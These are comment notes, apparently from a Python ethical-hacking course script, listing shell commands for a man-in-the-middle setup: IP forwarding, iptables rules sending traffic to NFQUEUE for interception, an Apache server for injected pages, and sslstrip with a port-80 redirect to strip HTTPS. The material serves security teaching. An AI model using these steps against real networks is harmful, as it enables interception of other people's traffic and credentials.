# python_for_ethical_hacking_2021
# commands to put in command prompt:
# to allow packets to flow: echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables for your own machine: iptables -I INPUT -j NFQUEUE —queue-num 0
# and then: iptables -I OUTPUT -j NFQUEUE —queue-num 0
# also need to use: iptables --flush | when switching between remote machine and your own
# iptables for remote machine: iptables -I FORWARD -j NFQUEUE —queue-num 0
# to enable my own html: service apache2 start
# to bypass https execute command: sslstrip
# iptables command for sslstrip (sslstrip's default port is 10000 so we are rerouting web packets, whose default port is 80 to sslstrip): iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
